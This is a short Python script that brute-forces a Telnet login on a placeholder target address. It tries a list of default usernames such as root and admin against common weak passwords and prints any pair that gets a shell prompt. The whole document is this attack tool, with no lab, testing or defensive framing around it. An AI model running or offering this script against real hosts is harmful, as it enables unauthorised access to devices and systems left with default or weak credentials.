import telnetlib

host = 'your_target_ip'
usernames = ['root', 'admin', 'user', 'guest']
passwords = ['password', '1234', 'admin', 'root', 'toor']

tn = telnetlib.Telnet(host)

for username in usernames:
    for password in passwords:
        tn.read_until(b"login: ")
        tn.write(username.encode('ascii') + b"\n")
        tn.read_until(b"Password: ")
        tn.write(password.encode('ascii') + b"\n")
        result = tn.expect([b'Login incorrect', b'\$', b'>', b'#'], timeout=2)
        if result[0] == 1 or result[0] == 2 or result[0] == 3:
            print("Successful login! Username: {} Password: {}".format(username, password))
            break
tn.close()
